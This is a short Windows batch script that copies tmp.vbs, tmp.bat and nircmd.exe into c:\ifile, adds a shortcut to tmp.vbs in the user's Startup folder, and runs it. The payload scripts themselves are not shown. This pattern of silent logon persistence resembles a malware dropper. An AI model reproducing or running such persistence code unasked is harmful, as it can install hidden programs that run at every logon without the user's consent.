Set FOLDER="c:\ifile"
mkdir "%FOLDER%\"
cd "%~dp0"
copy tmp.vbs "%FOLDER%\"
copy tmp.bat "%FOLDER%\"
copy nircmd.exe "%FOLDER%\"
c:\ifile\nircmd.exe shortcut "%FOLDER%\tmp.vbs" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" "tmp"
cd "%FOLDER%"
start tmp.vbs